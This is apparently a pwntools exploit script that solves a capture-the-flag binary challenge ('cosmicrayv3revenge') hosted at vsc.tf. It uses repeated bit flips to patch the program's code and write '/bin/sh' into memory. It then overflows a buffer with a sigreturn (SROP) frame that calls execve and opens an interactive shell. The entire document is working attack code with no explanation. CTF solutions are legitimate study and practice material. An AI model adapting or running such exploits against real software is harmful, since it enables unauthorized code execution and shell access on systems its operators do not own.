#!/usr/bin/python3

from pwn import *

exe = ELF('cosmicrayv3revenge_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x4015fa
        c
        ''')
        input()


if args.REMOTE:
    p = remote('vsc.tf', 7005)
else:
    p = process(exe.path)

sla(b'through:', b'0x4015fa')
sla(b'flip:', '6')

pa = b'a'*46 + p64(0) + p32(0x4015E3)
pa = pa.ljust(60, b'\0')
sa(b'New', pa)
sla(b'through:', f'0x4015fc')
sla(b'flip:', b'5')
sa(b'New', pa)
addr = 0x404080
binsh = b'/bin/sh'
for i in range(len(binsh)):
    for j in range(8):
        if bin(binsh[i])[2:].rjust(8, '0')[j] == '1':
            sla(b'through:', hex(addr + i))
            sla(b'flip:', str(j))
            sa(b'New value is', b'A'*46 + p64(0) + p64(exe.sym.main + 5))


sla(b'through:', f'0x404088')
sla(b'flip:', b'5')
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = addr
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x0000000000401602
pa += p32(0)+b'a'*6+p64(0x4015E3)*9 + bytes(frame)
sa(b'New', pa)



sla(b'through:', f'0x4015fc')
sla(b'flip:', b'5')
s(b'wan')
sla(b'through:', f'0x4015fb')
sla(b'flip:', b'2')
s(b'wan')
sla(b'through:', f'0x4015fb')
sla(b'flip:', b'3')
s(b'wan')
sla(b'through:', f'0x4015fb')
sla(b'flip:', b'6')
s(b'wan')
sla(b'through:', f'0x4015fb')
sla(b'flip:', b'7')
s(b'wan')
sla(b'through:', f'0x4015fa')
GDB()


sla(b'flip:', b'6')
s(b'wan;')
# sla(b'through:', f'0x4015fb')
# sla(b'flip:', b'4')
p.interactive()
